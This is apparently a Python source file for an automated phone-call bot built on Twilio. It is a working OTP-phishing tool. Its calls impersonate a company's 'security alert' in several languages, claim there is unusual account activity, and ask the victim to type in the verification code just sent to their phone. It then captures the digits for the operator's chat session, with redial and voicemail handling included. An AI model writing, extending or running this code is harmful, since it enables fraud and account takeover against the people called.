import os
import re
import threading
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather, Say

TWILIO_ACCOUNT_SID = os.environ.get("TWILIO_ACCOUNT_SID", "")
TWILIO_AUTH_TOKEN  = os.environ.get("TWILIO_AUTH_TOKEN", "")
TWILIO_PHONE       = os.environ.get("TWILIO_PHONE_NUMBER", "")

_active_calls = {}
_lock = threading.Lock()


def get_twilio_client():
    if not TWILIO_ACCOUNT_SID or not TWILIO_AUTH_TOKEN:
        raise ValueError("Twilio credentials not configured. Set TWILIO_ACCOUNT_SID and TWILIO_AUTH_TOKEN.")
    return Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)


def get_webhook_base() -> str:
    domains = os.environ.get("REPLIT_DOMAINS", "")
    dev_domain = os.environ.get("REPLIT_DEV_DOMAIN", "")
    if domains:
        domain = domains.split(",")[0].strip()
    elif dev_domain:
        domain = dev_domain
    else:
        domain = "localhost:8080"
    if not domain.startswith("http"):
        return f"https://{domain}"
    return domain


def store_call_data(call_sid: str, data: dict):
    with _lock:
        _active_calls[call_sid] = data


def get_call_data(call_sid: str) -> dict:
    with _lock:
        return _active_calls.get(call_sid, {})


def clear_call_data(call_sid: str):
    with _lock:
        _active_calls.pop(call_sid, None)


def store_pending_call(chat_id: str, user_id: str, name: str, company: str,
                       otp_digits: int, lang: str, phone: str,
                       custom_script: str = "") -> str:
    import uuid
    token = uuid.uuid4().hex[:12]
    with _lock:
        _active_calls[f"pending_{token}"] = {
            "chat_id": chat_id,
            "user_id": user_id,
            "name": name,
            "company": company,
            "otp_digits": otp_digits,
            "lang": lang,
            "phone": phone,
            "custom_script": custom_script,
        }
    return token


def get_pending_call(token: str) -> dict:
    with _lock:
        return _active_calls.get(f"pending_{token}", {})


def initiate_call(phone: str, chat_id: str, user_id: str, name: str,
                  company: str, otp_digits: int = 6, lang: str = "en",
                  custom_script: str = "") -> dict:
    client = get_twilio_client()
    base = get_webhook_base()

    token = store_pending_call(
        chat_id=str(chat_id),
        user_id=str(user_id),
        name=name,
        company=company,
        otp_digits=otp_digits,
        lang=lang,
        phone=phone,
        custom_script=custom_script,
    )

    voice_url    = f"{base}/voice/otp?token={token}"
    status_url   = f"{base}/voice/status?token={token}"

    call = client.calls.create(
        to=phone,
        from_=TWILIO_PHONE,
        url=voice_url,
        status_callback=status_url,
        status_callback_event=["initiated", "ringing", "answered", "completed"],
        status_callback_method="POST",
        machine_detection="DetectMessageEnd",
        machine_detection_timeout=8,
        async_amd=True,
        async_amd_status_callback=f"{base}/voice/amd?token={token}",
        async_amd_status_callback_method="POST",
    )

    store_call_data(call.sid, {
        "chat_id": str(chat_id),
        "user_id": str(user_id),
        "name": name,
        "company": company,
        "otp_digits": otp_digits,
        "lang": lang,
        "phone": phone,
        "token": token,
        "custom_script": custom_script,
    })

    return {"sid": call.sid, "status": call.status, "token": token}


def get_call_status(call_sid: str) -> dict:
    client = get_twilio_client()
    call = client.calls(call_sid).fetch()
    return {
        "sid": call.sid,
        "status": call.status,
        "duration": call.duration,
        "direction": call.direction,
        "from_": call.from_formatted,
        "to": call.to_formatted,
    }


def hangup_call(call_sid: str) -> bool:
    try:
        client = get_twilio_client()
        client.calls(call_sid).update(status="completed")
        return True
    except Exception:
        return False


def redial_call(call_sid: str, chat_id: str, user_id: str, name: str,
                company: str, otp_digits: int = 6, lang: str = "en") -> dict:
    data = get_call_data(call_sid)
    phone = data.get("phone", "")
    if not phone:
        raise ValueError("Original call data not found. Cannot redial.")
    return initiate_call(phone, chat_id, user_id, name, company, otp_digits, lang,
                         custom_script=data.get("custom_script", ""))


LANGUAGES = {
    "en": "English",
    "hi": "Hindi",
    "es": "Spanish",
    "fr": "French",
    "de": "German",
    "pt": "Portuguese",
    "ar": "Arabic",
}

# Polly.Kajal = Neural Indian female voice (warm, natural, sweet tone)
VOICE_MAP = {
    "en": ("alice",        "en-US"),
    "hi": ("Polly.Kajal",  "hi-IN"),
    "es": ("alice",        "es-ES"),
    "fr": ("alice",        "fr-FR"),
    "de": ("alice",        "de-DE"),
    "pt": ("alice",        "pt-BR"),
    "ar": ("alice",        "ar"),
}

# SSML prosody settings for Hindi — slow and sweet
_HI_RATE  = "slow"
_HI_PITCH = "+8%"


def _append_say(parent, text: str, voice: str, language: str, lang: str = "en"):
    """Append a <Say> to parent (VoiceResponse or Gather)."""
    parent.say(text, voice=voice, language=language)


def _apply_hindi_ssml(twiml_str: str) -> str:
    """
    Post-process a TwiML string: wrap text inside every <Say voice="Polly.Kajal"...>
    element with SSML <prosody rate="slow" pitch="+8%"> tags so the voice
    sounds slow and sweet. Amazon Polly voices interpret SSML inside <Say>.
    """
    def wrap_prosody(match):
        opening = match.group(1)  # e.g. <Say voice="Polly.Kajal" language="hi-IN">
        content = match.group(2)  # inner text
        if "<prosody" in content:
            return match.group(0)  # already wrapped, skip
        return (
            f'{opening}'
            f'<prosody rate="{_HI_RATE}" pitch="{_HI_PITCH}">'
            f'{content}'
            f'</prosody>'
            f'</Say>'
        )

    pattern = r'(<Say[^>]*Polly\.Kajal[^>]*>)(.*?)</Say>'
    return re.sub(pattern, wrap_prosody, twiml_str, flags=re.DOTALL)


def build_voice_twiml_main(token: str, base: str, data: dict) -> str:
    name          = data.get("name", "Customer")
    company       = data.get("company", "Our Company")
    lang          = data.get("lang", "en")
    custom_script = data.get("custom_script", "").strip()
    voice, language = VOICE_MAP.get(lang, ("alice", "en-US"))

    default_scripts = {
        "en": (
            f"Hello, this is a security alert from {company}. "
            f"This call is for {name}. "
            f"If you are {name}, please press 1 now to continue."
        ),
        "hi": (
            f"नमस्ते, यह {company} की तरफ से एक ज़रूरी सुरक्षा सूचना है। "
            f"यह कॉल {name} के लिए है। "
            f"अगर आप {name} हैं, तो कृपया आगे बढ़ने के लिए 1 दबाएँ।"
        ),
        "es": (
            f"Hola, esta es una alerta de seguridad de {company}. "
            f"Esta llamada es para {name}. "
            f"Si usted es {name}, por favor presione 1 para continuar."
        ),
        "fr": (
            f"Bonjour, ceci est une alerte de sécurité de {company}. "
            f"Cet appel est pour {name}. "
            f"Si vous êtes {name}, veuillez appuyer sur 1 pour continuer."
        ),
        "de": (
            f"Hallo, dies ist eine Sicherheitswarnung von {company}. "
            f"Dieser Anruf ist für {name}. "
            f"Wenn Sie {name} sind, drücken Sie bitte 1, um fortzufahren."
        ),
        "pt": (
            f"Olá, este é um alerta de segurança da {company}. "
            f"Esta ligação é para {name}. "
            f"Se você é {name}, por favor pressione 1 para continuar."
        ),
    }

    # Use custom script if provided, otherwise use default
    opening_text = custom_script if custom_script else default_scripts.get(lang, default_scripts["en"])

    resp = VoiceResponse()
    resp.pause(length=1)

    gather = Gather(
        num_digits=1,
        action=f"{base}/voice/gather?token={token}",
        method="POST",
        timeout=15,
        finish_on_key="#",
    )
    _append_say(gather, opening_text, voice, language, lang)
    resp.append(gather)

    # No response fallback
    _append_say(resp, "We did not receive a response. Goodbye.", "alice", "en-US", "en")
    resp.hangup()

    twiml = str(resp)
    return _apply_hindi_ssml(twiml) if lang == "hi" else twiml


def build_voice_twiml_gather(token: str, base: str, data: dict, digit: str) -> str:
    lang       = data.get("lang", "en")
    otp_digits = int(data.get("otp_digits", 6))
    voice, language = VOICE_MAP.get(lang, ("alice", "en-US"))

    explain_scripts = {
        "en": (
            "We have detected unusual activity on your account. "
            "To secure your account, please enter the verification code sent to your registered number."
        ),
        "hi": (
            "हमने आपके खाते पर असामान्य गतिविधि पाई है। "
            "आपका खाता सुरक्षित रखने के लिए, कृपया अपने नंबर पर भेजा गया सत्यापन कोड दर्ज करें।"
        ),
        "es": (
            "Hemos detectado actividad inusual en su cuenta. "
            "Para asegurar su cuenta, por favor ingrese el código de verificación enviado a su número registrado."
        ),
        "fr": (
            "Nous avons détecté une activité inhabituelle sur votre compte. "
            "Pour sécuriser votre compte, veuillez entrer le code de vérification envoyé à votre numéro enregistré."
        ),
        "de": (
            "Wir haben ungewöhnliche Aktivitäten auf Ihrem Konto festgestellt. "
            "Um Ihr Konto zu sichern, geben Sie bitte den Verifizierungscode ein, der an Ihre registrierte Nummer gesendet wurde."
        ),
        "pt": (
            "Detectamos atividade incomum em sua conta. "
            "Para proteger sua conta, insira o código de verificação enviado para seu número cadastrado."
        ),
    }

    ask_scripts = {
        "en": f"Please enter your {otp_digits}-digit code now, followed by the pound key.",
        "hi": f"कृपया अभी अपना {otp_digits} अंकों का कोड दर्ज करें, उसके बाद हैश का बटन दबाएँ।",
        "es": f"Por favor ingrese su código de {otp_digits} dígitos ahora, seguido de la tecla almohadilla.",
        "fr": f"Veuillez entrer votre code à {otp_digits} chiffres maintenant, suivi de la touche dièse.",
        "de": f"Bitte geben Sie jetzt Ihren {otp_digits}-stelligen Code ein, gefolgt von der Rautetaste.",
        "pt": f"Por favor insira seu código de {otp_digits} dígitos agora, seguido da tecla cerquilha.",
    }

    invalid_scripts = {
        "en": "Sorry, that is not a valid option. Please try again.",
        "hi": "क्षमा करें, यह विकल्प मान्य नहीं है। कृपया फिर से प्रयास करें।",
        "es": "Lo sentimos, esa no es una opción válida. Por favor intente de nuevo.",
        "fr": "Désolé, ce n'est pas une option valide. Veuillez réessayer.",
        "de": "Entschuldigung, das ist keine gültige Option. Bitte versuchen Sie es erneut.",
        "pt": "Desculpe, essa não é uma opção válida. Por favor tente novamente.",
    }

    resp = VoiceResponse()

    if digit == "1":
        explain = explain_scripts.get(lang, explain_scripts["en"])
        ask     = ask_scripts.get(lang, ask_scripts["en"])

        _append_say(resp, explain, voice, language, lang)
        resp.pause(length=1)

        gather = Gather(
            num_digits=otp_digits,
            action=f"{base}/voice/gatherotp?token={token}",
            method="POST",
            timeout=20,
            finish_on_key="#",
        )
        _append_say(gather, ask, voice, language, lang)
        resp.append(gather)

        _append_say(resp, "We did not receive your code. Goodbye.", "alice", "en-US", "en")
        resp.hangup()
    else:
        invalid = invalid_scripts.get(lang, invalid_scripts["en"])
        _append_say(resp, invalid, voice, language, lang)
        resp.pause(length=1)
        resp.redirect(f"{base}/voice/otp?token={token}", method="POST")

    twiml = str(resp)
    return _apply_hindi_ssml(twiml) if lang == "hi" else twiml


def build_voice_twiml_otp_captured(otp: str, lang: str) -> str:
    voice, language = VOICE_MAP.get(lang, ("alice", "en-US"))

    thanks = {
        "en": "Thank you. Your verification code has been received. Have a great day. Goodbye.",
        "hi": "धन्यवाद। आपका सत्यापन कोड सफलतापूर्वक प्राप्त हो गया है। आपका दिन मंगलमय हो।",
        "es": "Gracias. Su código de verificación ha sido recibido. Que tenga un buen día. Adiós.",
        "fr": "Merci. Votre code de vérification a été reçu. Bonne journée. Au revoir.",
        "de": "Danke. Ihr Verifizierungscode wurde empfangen. Haben Sie einen schönen Tag. Auf Wiederhören.",
        "pt": "Obrigado. Seu código de verificação foi recebido. Tenha um ótimo dia. Adeus.",
    }

    resp = VoiceResponse()
    _append_say(resp, thanks.get(lang, thanks["en"]), voice, language, lang)
    resp.pause(length=1)
    resp.hangup()
    twiml = str(resp)
    return _apply_hindi_ssml(twiml) if lang == "hi" else twiml


def build_voice_twiml_voicemail(lang: str) -> str:
    voice, language = VOICE_MAP.get(lang, ("alice", "en-US"))

    msgs = {
        "en": "Hello, this is an important security message. Please call us back at your earliest convenience. Thank you.",
        "hi": "नमस्ते, यह एक ज़रूरी सुरक्षा संदेश है। कृपया जल्द से जल्द हमें वापस कॉल करें। धन्यवाद।",
        "es": "Hola, este es un mensaje de seguridad importante. Por favor llámenos de vuelta lo antes posible. Gracias.",
        "fr": "Bonjour, ceci est un message de sécurité important. Veuillez nous rappeler dès que possible. Merci.",
        "de": "Hallo, dies ist eine wichtige Sicherheitsnachricht. Bitte rufen Sie uns so bald wie möglich zurück. Danke.",
        "pt": "Olá, esta é uma mensagem de segurança importante. Por favor ligue de volta o mais rápido possível. Obrigado.",
    }

    resp = VoiceResponse()
    _append_say(resp, msgs.get(lang, msgs["en"]), voice, language, lang)
    resp.hangup()
    twiml = str(resp)
    return _apply_hindi_ssml(twiml) if lang == "hi" else twiml
